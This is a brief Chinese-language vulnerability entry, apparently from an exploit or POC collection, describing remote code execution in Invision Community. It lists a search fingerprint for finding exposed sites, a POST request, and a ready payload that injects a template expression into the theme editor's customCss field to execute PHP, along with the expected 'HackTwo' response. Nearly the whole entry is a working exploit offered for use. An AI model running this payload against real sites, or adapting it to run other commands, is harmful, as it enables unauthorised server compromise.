# InvisonCommunity存在远程代码执行漏洞

InvisonCommunity ｜ 命令执行 ｜ —
- **指纹**：`body="Invision"`
- **请求**：`POST / HTTP/1.1`

**Payload**
```
app=core&module=system&controller=themeeditor&do=customCss&content={expression="die('Hello'. base64_decode('SGFja1R3bw'))"}
```
- **响应特征**：200 HackTwo